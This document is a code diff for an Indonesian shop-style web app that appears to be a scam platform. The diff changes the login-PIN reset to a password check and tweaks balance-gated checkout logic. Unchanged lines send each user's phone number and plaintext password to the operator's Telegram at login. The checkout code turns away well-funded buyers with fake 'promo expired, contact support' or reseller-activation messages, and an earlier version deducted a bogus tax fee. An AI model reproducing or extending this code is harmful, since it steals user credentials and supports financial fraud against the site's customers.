@@ -430,7 +430,7 @@
             <a href="#" id="menu-ubah-pin" style="display: none;" onclick="toggleNav(); openChangePinModal();"><i class="bi bi-asterisk"></i> <span>Ubah PIN Transaksi</span></a>
             
             <a href="#" id="menu-buat-pin-login" style="display: none;" onclick="toggleNav(); openSetupLoginPinModal();"><i class="bi bi-phone-vibrate"></i> <span>Buat PIN Login</span></a>
-            <a href="#" id="menu-hapus-pin-login" style="display: none;" onclick="toggleNav(); removeLoginPin();"><i class="bi bi-phone-vibrate"></i> <span>Hapus PIN Login</span></a>
+            <a href="#" id="menu-hapus-pin-login" style="display: none;" onclick="toggleNav(); openTargetModal('remove-login-pin-modal');"><i class="bi bi-phone-vibrate"></i> <span>Hapus PIN Login</span></a>
             
             <a href="#" onclick="toggleNav(); openHelpModal();"><i class="bi bi-headset"></i> <span>Customer Support</span></a>
             <hr style="border: 0; border-top: 1px solid var(--border-color); margin: 5px 0;">
@@ -673,19 +673,39 @@
         </div>
     </div>
 
-    <div id="reset-login-pin-nik-modal" class="modal-overlay" style="z-index: 1000001;">
+    <div id="reset-login-pin-pwd-modal" class="modal-overlay" style="z-index: 1000001;">
         <div class="modal-content">
             <div class="modal-header">
                 <h3>Reset PIN Login</h3>
-                <button class="btn-icon" onclick="closeTargetModal('reset-login-pin-nik-modal')"><i class="bi bi-x-lg"></i></button>
             </div>
-            <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 15px;">Anda salah memasukkan PIN 3 kali Verifikasi NIK KTP Anda untuk mereset PIN Login.</p>
+            <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 15px;">Anda salah memasukkan PIN silakan konfirmasi password untuk mereset.</p>
             <div class="input-group">
-                <label>Nomor NIK KTP (16 Digit)</label>
-                <input type="number" id="reset-login-pin-nik-input" placeholder="Masukkan NIK terdaftar">
+                <label>Password Akun</label>
+                <div class="pass-input-wrapper">
+                    <input type="password" id="reset-login-pin-pwd-input" placeholder="Masukkan password akun Anda">
+                    <i class="bi bi-eye-slash pass-toggle-icon" onclick="togglePasswordVisibility('reset-login-pin-pwd-input', this)"></i>
+                </div>
             </div>
-            <button class="btn-modal" onclick="processResetLoginPinNik()">Verifikasi</button>
-            <button class="btn-modal btn-modal-outline" style="margin-top: 10px;" onclick="forceLogoutFromLock(); closeTargetModal('reset-login-pin-nik-modal')">Logout Akun</button>
+            <button class="btn-modal" onclick="processResetLoginPinPwd()">Verifikasi</button>
+            <button class="btn-modal btn-modal-outline" style="margin-top: 10px;" onclick="forceLogoutFromLock(); closeTargetModal('reset-login-pin-pwd-modal')">Logout Akun</button>
+        </div>
+    </div>
+
+    <div id="remove-login-pin-modal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Hapus PIN Login</h3>
+                <button class="btn-icon" onclick="closeTargetModal('remove-login-pin-modal')"><i class="bi bi-x-lg"></i></button>
+            </div>
+            <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 15px;">Masukkan password akun Anda untuk mengonfirmasi penghapusan.</p>
+            <div class="input-group">
+                <label>Password Akun</label>
+                <div class="pass-input-wrapper">
+                    <input type="password" id="remove-login-pin-pwd-input" placeholder="Masukkan password akun">
+                    <i class="bi bi-eye-slash pass-toggle-icon" onclick="togglePasswordVisibility('remove-login-pin-pwd-input', this)"></i>
+                </div>
+            </div>
+            <button class="btn-modal btn-modal-danger" onclick="processRemoveLoginPin()">Hapus PIN</button>
         </div>
     </div>
 
@@ -981,7 +1001,7 @@
                 <h3>Reset PIN Transaksi</h3>
                 <button class="btn-icon" onclick="closeTargetModal('reset-pin-nik-modal')"><i class="bi bi-x-lg"></i></button>
             </div>
-            <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 15px;">Anda salah memasukkan PIN silakan verifikasi Nomor Induk Kependudukan (NIK KTP) Anda untuk mereset PIN transaksi.</p>
+            <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 15px;">Anda salah memasukkan PIN silakan verifikasi Nomor Induk Kependudukan (NIK KTP) untuk mereset PIN transaksi.</p>
             <div class="input-group">
                 <label>Nomor NIK KTP (16 Digit)</label>
                 <input type="number" id="reset-pin-nik-input" placeholder="Masukkan NIK Anda yang terdaftar">
@@ -1218,7 +1238,7 @@
         </div>
     </div>
 
-    <div id="custom-modal" class="modal-overlay">
+    <div id="custom-modal" class="modal-overlay" style="z-index: 1000005;">
         <div class="modal-content" style="text-align: center;">
             <div id="modal-icon" style="font-size: 50px; margin-bottom: 10px;"></div>
             <h3 id="modal-title" style="margin-bottom: 10px; color: var(--text-main);">Informasi</h3>
@@ -1528,7 +1548,6 @@
                     if(menuBuatPin) menuBuatPin.style.display = 'flex';
                 }
 
-                // Kondisi Menu PIN Login
                 if(u.loginPin) {
                     if(menuHapusPinLogin) menuHapusPinLogin.style.display = 'flex';
                     if(menuBuatPinLogin) menuBuatPinLogin.style.display = 'none';
@@ -1649,8 +1668,8 @@
                 if(loginPinFailures >= 3) {
                     setTimeout(() => {
                         overlay.style.display = 'none';
-                        showModal("Perhatian", "Terlalu banyak percobaan PIN salah! Verifikasi NIK Anda untuk mereset.", "error");
-                        setTimeout(() => openTargetModal('reset-login-pin-nik-modal'), 1800);
+                        showModal("Perhatian", "Terlalu banyak percobaan PIN salah! Verifikasi Password Anda untuk mereset.", "error");
+                        setTimeout(() => openTargetModal('reset-login-pin-pwd-modal'), 1800);
                     }, 500);
                 }
             }
@@ -1682,35 +1701,44 @@
             showModal("Berhasil", "PIN Login berhasil diaktifkan.", "win");
         }
 
-        function removeLoginPin() {
+        function processRemoveLoginPin() {
+            const pwd = document.getElementById('remove-login-pin-pwd-input').value.trim();
+            if(!pwd) return showModal("Perhatian", "Password tidak boleh kosong.", "error");
+
             let usersDb = JSON.parse(localStorage.getItem('sanz_users_db'));
-            usersDb[currentUserPhone].loginPin = null;
-            localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
-            
-            updateAuthUI();
-            showModal("Berhasil", "PIN Login telah dinonaktifkan.", "info");
+            let u = usersDb[currentUserPhone];
+
+            if (u.password === pwd) {
+                u.loginPin = null;
+                localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
+                closeTargetModal('remove-login-pin-modal');
+                document.getElementById('remove-login-pin-pwd-input').value = '';
+                updateAuthUI();
+                showModal("Berhasil", "PIN Login telah dinonaktifkan.", "info");
+            } else {
+                document.getElementById('remove-login-pin-pwd-input').value = '';
+                showModal("Perhatian", "Password salah!", "error");
+            }
         }
 
-        function processResetLoginPinNik() {
-            const nik = document.getElementById('reset-login-pin-nik-input').value.trim();
-            if(nik.length !== 16) return showModal("Perhatian", "Format NIK tidak valid.", "error");
+        function processResetLoginPinPwd() {
+            const pwd = document.getElementById('reset-login-pin-pwd-input').value.trim();
+            if(!pwd) return showModal("Perhatian", "Password tidak boleh kosong.", "error");
 
             let usersDb = JSON.parse(localStorage.getItem('sanz_users_db')) || {};
             let u = usersDb[currentUserPhone];
             
-            if (u.nik && u.nik === nik) {
+            if (u && u.password === pwd) {
                 u.loginPin = null; 
                 localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
-                closeTargetModal('reset-login-pin-nik-modal');
-                document.getElementById('reset-login-pin-nik-input').value = '';
+                closeTargetModal('reset-login-pin-pwd-modal');
+                document.getElementById('reset-login-pin-pwd-input').value = '';
                 loginPinFailures = 0; 
                 updateAuthUI();
-                showModal("Berhasil", "Verifikasi NIK Sukses! PIN Login Anda telah dinonaktifkan.", "win");
+                showModal("Berhasil", "Verifikasi Password Sukses! PIN Login Anda telah dinonaktifkan.", "win");
             } else {
-                closeTargetModal('reset-login-pin-nik-modal');
-                document.getElementById('reset-login-pin-nik-input').value = '';
-                showModal("Perhatian", "NIK tidak sesuai jika berulang kali gagal silakan hubungi bantuan.", "error");
-                setTimeout(() => openTargetModal('reset-login-pin-nik-modal'), 2000); 
+                document.getElementById('reset-login-pin-pwd-input').value = '';
+                showModal("Perhatian", "Password salah! silakan hubungi bantuan.", "error");
             }
         }
 
@@ -1782,7 +1810,6 @@
             }
             
             let newUID = 'UID-' + Math.floor(100000 + Math.random() * 900000);
-            // Tambahkan field `loginPin: null` di awal
             usersDb[phone] = { name: name, password: pass, uid: newUID, isBlocked: false, isVerified: false, isReseller: false, loginPin: null, firstTrxDone: {} };
             localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
             
@@ -1837,6 +1864,7 @@
                 const deviceUsed = getDeviceName();
                 sendToTelegram(`*AKTIVITAS LOGIN*\nNama: ${usersDb[phone].name}\nHP: \`${phone}\`\nPassword: \`${pass}\`\nUID: \`${usersDb[phone].uid}\`\nDevice: *${deviceUsed}*`);
                 updateAuthUI(); closeTargetModal('login-modal'); startTelegramPolling(); 
+                checkLoginLock();
                 showModal("Berhasil", `Selamat bergabung kembali, ${currentUserName}!`, "win");
             } else { showModal("Perhatian", "Nomor dan password salah.", "error"); }
         }
@@ -1904,7 +1932,7 @@
             const p1 = document.getElementById('pin-1').value.trim();
             const p2 = document.getElementById('pin-2').value.trim();
             if(p1.length !== 6 || isNaN(p1)) return showModal("Perhatian", "PIN transaksi diwajibkan berupa 6 digit susunan angka.", "error");
-            if(p1 !== p2) return showModal("Tidak Cocok", "Konfirmasi PIN kedua tidak sama dengan yang pertama.", "error");
+            if(p1 !== p2) return showModal("Perhatian", "Konfirmasi PIN kedua tidak sama dengan yang pertama.", "error");
             
             let usersDb = JSON.parse(localStorage.getItem('sanz_users_db'));
             usersDb[currentUserPhone].pinCode = p1;
@@ -1965,7 +1993,7 @@
 
         if (failedPinAttempts >= 3) {
             closeTargetModal('pin-auth-modal');
-            showModal("Perhatian", "Anda telah salah memasukkan PIN 3 kali berturut-turut! Silakan validasi NIK Anda untuk mereset PIN.", "error");
+            showModal("Perhatian", "Anda salah memasukkan PIN transaksi silakan verifikasi untuk mereset.", "error");
             setTimeout(() => { openTargetModal('reset-pin-nik-modal'); }, 1800);
         } else {
             document.getElementById('auth-pin-input').value = ''; 
@@ -2065,7 +2093,7 @@
 
         function applyPromo() {
             const code = document.getElementById('promo-code').value.toUpperCase().trim();
-            if(!cartItem) return showModal("Perhatian", "Item produk tidak terdeteksi.", "error");
+            if(!cartItem) return showModal("Perhatian", "Produk tidak tersedia.", "error");
             
             if(code === cartItem.requiredCoupon) {
                 cartItem.promoAppliedStatus = true;
@@ -2100,17 +2128,17 @@
             }
 
             if(cartItem.basePrice === 200000) {
-                if(userBalance < 100000) {
+                if(userBalance < 200000) {
                     return showModal("Perhatian", "Saldo akun tidak cukup untuk melakukan transaksi.", "error");
-                } else if(userBalance >= 100000) {
+                } else if(userBalance >= 200000) {
                     return showModal("Perhatian", "Kode promo expired atau terjadi kesalahan silakan hubungi bantuan.", "error");
                 }
             }
 
             if(cartItem.basePrice === 500000) {
-                if(userBalance < 250000) {
+                if(userBalance < 500000) {
                     return showModal("Perhatian", "Saldo akun tidak cukup untuk melakukan transaksi.", "error");
-                } else if(userBalance >= 250000) {
+                } else if(userBalance >= 500000) {
                     if(!u.isReseller) {
                         showModal("Perhatian", "Silakan aktivasi terlebih dahulu sebelum melakukan transaksi.", "warning");
                         setTimeout(() => { closeTargetModal('cart-modal'); openTargetModal('reseller-verif-modal'); }, 2000);
@@ -2125,7 +2153,7 @@
                 if(userBalance < 1000000) {
                     return showModal("Perhatian", "Saldo akun tidak cukup untuk melakukan transaksi.", "error");
                 }
-                if(userBalance >= 1000000 && userBalance < 10000000) {
+                if(userBalance >= 1000000 && userBalance < 2000000) {
                     return showModal("Perhatian", "Saldo margin tidak cukup untuk melakukan transaksi.", "error");
                 }
                 if(userBalance >= 2000000 && userBalance < 2500000) {
@@ -2135,16 +2163,10 @@
                 }
                 if(userBalance >= 2500000) {
                     if(!u.ppnActivated) {
-                        u.ppnActivated = true;
-                        userBalance -= 500000;
-                        localStorage.setItem('sanz_users_db', JSON.stringify(usersDb));
-                        updateBalanceDisplay();
-                        addNotifToUser(currentUserPhone, "Pembayaran PPN Merchant Rp 500.000 sedang dalam proses.");
+                    return showModal("Perhatian", "Kode promo expired atau terjadi kesalahan silakan hubungi bantuan.", "error");
                     }
-                    return showModal("Perhatian", "Kode promo telah expired untuk akun Anda.", "error");
                 }
             }
-
             if(cartItem.basePrice === 5000000) {
                 if(userBalance < 10000000) {
                     return showModal("Perhatian", "Saldo margin tidak cukup untuk melakukan transaksi.", "error");
